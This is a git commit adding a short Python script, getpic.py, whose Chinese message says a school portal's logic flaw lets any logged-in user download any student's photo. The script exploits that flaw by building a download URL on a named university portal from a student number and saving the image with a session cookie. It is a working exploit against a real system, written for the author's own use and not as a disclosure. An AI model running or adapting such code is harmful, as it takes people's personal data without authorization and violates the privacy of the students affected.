8d7c63a3298601804d3781dffa7e4b34d36172f2
mtfly <915261512@qq.com>
2014-12-12 21:13:46 +0800

    Create getpic.py
    学校的系统逻辑错误，只要是登陆的用户都可以下载任意学生照片信息。弄一个小程序，方便自己使用

---
+++ getpic.py
@@ -0,0 +1,9 @@
+
+
+import requests
+n=raw_input('input the school number:')
+url=r'http://my.zzti.edu.cn/attachmentDownload.portal?notUseCache=true&type=userFace&ownerId='+n
+headers={'Cookie': r'*'}
+a=requests.get(url,headers=headers)
+with open("get.jpg", "wb") as code:
+     code.write(a.content)
